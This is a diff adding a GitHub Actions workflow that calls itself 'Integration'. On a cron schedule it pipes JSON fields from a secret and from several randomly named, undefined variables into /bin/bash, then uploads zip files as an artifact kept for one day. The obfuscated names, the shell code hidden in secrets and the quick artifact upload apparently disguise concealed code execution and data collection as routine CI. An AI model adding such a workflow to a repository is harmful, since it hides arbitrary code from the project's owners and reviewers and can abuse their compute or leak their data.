@@ -1,0 +1,34 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '52 4,10,16,22 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          s366: ${{ secrets.s366 }}
+        run: |
+          printf '%s' "$s366" | jq -r .cxbig32 | /bin/bash
+          printf '%s' "$ovdkb67740" | jq -r .wqkak1349 | /bin/bash
+          printf '%s' "$fgep2274" | jq -r .eah2255 | /bin/bash
+          echo $movr7 | jq -r .pd403 | /bin/bash
+          printf '%s' "$fk4" | jq -r .mi69 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: IlD22cnO
+          path: "*.zip"
+          retention-days: 1
